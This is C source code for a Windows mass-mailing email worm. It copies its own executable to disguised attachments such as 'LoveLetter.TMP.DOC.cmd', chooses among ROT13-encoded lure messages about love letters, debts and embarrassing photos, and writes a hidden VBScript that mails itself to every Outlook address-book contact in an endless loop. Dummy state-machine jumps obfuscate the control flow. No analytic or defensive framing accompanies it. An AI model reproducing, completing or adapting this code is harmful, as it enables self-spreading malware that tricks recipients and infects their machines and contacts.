#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>

#pragma optimize("", off)
DWORD WINAPI _MassMailMain(void)
{
    char Subject[100], Message[512], Attachment[100], MyPath[100], VBSFile[50], RanNu[20];
    unsigned char VBS_Mail[2000];
    FILE *file;
    int rand_val;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto state_1;
    if (dummy_state == 2) goto state_2;
    if (dummy_state == 3) goto state_case0;
    if (dummy_state == 4) goto state_case1;
    if (dummy_state == 5) goto state_case2;
    if (dummy_state == 6) goto state_case3;
    if (dummy_state == 7) goto state_case4;
    if (dummy_state == 8) goto state_after_case;
    if (dummy_state == 0) goto dummy_end;

state_1:
    memset(Subject, 0, sizeof(Subject));
    memset(Message, 0, sizeof(Message));
    memset(Attachment, 0, sizeof(Attachment));
    memset(MyPath, 0, sizeof(MyPath));
    memset(VBS_Mail, 0, sizeof(VBS_Mail));
    memset(VBSFile, 0, sizeof(VBSFile));
    memset(RanNu, 0, sizeof(RanNu));

    srand(GetTickCount());
    sprintf(RanNu, "\\mailer.vbs");
    GetEnvironmentVariableA("HOMEDRIVE", Attachment, sizeof(Attachment));
    strcpy(VBSFile, Attachment);
    strcat(VBSFile, RanNu);
    GetModuleFileNameA(NULL, MyPath, sizeof(MyPath));

    dummy_state = 2;
    goto dummy_dispatcher;

state_2:
    rand_val = rand() % 5;
    if (rand_val == 0) {
        dummy_state = 3;
        goto dummy_dispatcher;
    } else if (rand_val == 1) {
        dummy_state = 4;
        goto dummy_dispatcher;
    } else if (rand_val == 2) {
        dummy_state = 5;
        goto dummy_dispatcher;
    } else if (rand_val == 3) {
        dummy_state = 6;
        goto dummy_dispatcher;
    } else { // rand_val == 4
        dummy_state = 7;
        goto dummy_dispatcher;
    }

state_case0:
    strcpy(Subject, "Zl cnffvbangr ybir gbjneqf lbh");
    strcpy(Message, "Zl ybiryrggre sbe lbh vf va gur nggnpurq qbphzrag. =)");
    strcat(Attachment, "\\LoveYouLife.TMP.DOC.cmd");
    CopyFileA(MyPath, Attachment, FALSE);
    _CiphStr(Attachment, Attachment);
    dummy_state = 8;
    goto dummy_dispatcher;

state_case1:
    strcpy(Subject, "Lbh bjr zr ovt gvzr");
    strcpy(Message, "Lbh pna'g whfg sbetrg nobhg gur ovyy lbh yrsg zr jvgu. V nggnpurq gb gur qbphzragf nf cebbs lbh bjr zr.");
    strcat(Attachment, "\\DocumentsPay.TMP.DOC.cmd");
    CopyFileA(MyPath, Attachment, FALSE);
    _CiphStr(Attachment, Attachment);
    dummy_state = 8;
    goto dummy_dispatcher;

state_case2:
    strcpy(Subject, "Url! Purpx guvf bhg!");
    strcpy(Message, "V guvax gung'f lbh va guvf cvpgher, ubj rzonerffvat!");
    strcat(Attachment, "\\PartyTips.TMP.JPEG.cmd");
    CopyFileA(MyPath, Attachment, FALSE);
    _CiphStr(Attachment, Attachment);
    dummy_state = 8;
    goto dummy_dispatcher;

state_case3:
    strcpy(Subject, "Vf gung lbh?");
    strcpy(Message, "V erpnyy lbh orvat va guvf cvpgher, juvpu crefba ner lbh?");
    strcat(Attachment, "\\BeachPicture.TMP.JPEG.cmd");
    CopyFileA(MyPath, Attachment, FALSE);
    _CiphStr(Attachment, Attachment);
    dummy_state = 8;
    goto dummy_dispatcher;

state_case4:
    strcpy(Subject, "V YBIR LBH!");
    strcpy(Message, "Cyrnfr ernq gur nggnpurq ybir yrggre sebz zr. ;)");
    strcat(Attachment, "\\LoveLetter.TMP.DOC.cmd");
    CopyFileA(MyPath, Attachment, FALSE);
    _CiphStr(Attachment, Attachment);
    dummy_state = 8;
    goto dummy_dispatcher;

state_after_case:
    sprintf((char *)VBS_Mail,
            "qvz k\r\n"
            "erz\r\n"
            "ba reebe erfhzr arkg\r\n"
            "erz\r\n"
            "Frg sfb =\"Fpevcgvat.SvyrFlfgrz.Bowrpg\"\r\n"
            "erz\r\n"
            "Frg fb=PerngrBowrpg(sfb)\r\n"
            "erz\r\n"
            "Frg by=PerngrBowrpg(\"Bhgybbx.Nccyvgngvba\")\r\n"
            "erz\r\n"
            "Frg bhg=JFpevcg.PerngrBowrpg(\"Bhgybbx.Nccyvgngvba\")\r\n"
            "erz\r\n"
            "Frg zncv = bhg.TrgAnzrFcnpr(\"ZNCV\")\r\n"
            "erz\r\n"
            "Frg n = zncv.NqqerffYvfgf(1)\r\n"
            "erz\r\n"
            "Frg nr=n.NqqerffRagevrf\r\n"
            "erz\r\n"
            "Sbe k=1 Gb nr.Pbhag\r\n"
            "erz\r\n"
            "Frg pv=by.PerngrVgrz(0)\r\n"
            "erz\r\n"
            "Frg Znvy=pv\r\n"
            "erz\r\n"
            "Znvy.gb=by.TrgAnzrFcnpr(\"ZNCV\").NqqerffYvfgf(1).NqqerffRagevrf(k)\r\n"
            "erz\r\n"
            "Znvy.Fhowrpg=\"%s\"\r\n"
            "erz\r\n"
            "Znvy.Obql=\"%s\"\r\n"
            "erz\r\n"
            "Znvy.Nggnpuzragf.Nqq(\"%s\")\r\n"
            "erz\r\n"
            "Znvy.fraq\r\n"
            "erz\r\n"
            "Arkg\r\n"
            "erz\r\n"
            "by.Dhvg\r\n",
            Subject, Message, Attachment);

    _CiphStr((char *)VBS_Mail, (char *)VBS_Mail);

    file = fopen(VBSFile, "wb");
    fputs((const char *)VBS_Mail, file);
    fclose(file);

    ShellExecuteA(NULL, "open", VBSFile, NULL, NULL, SW_HIDE);
    Sleep(60000);

    dummy_state = 1;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
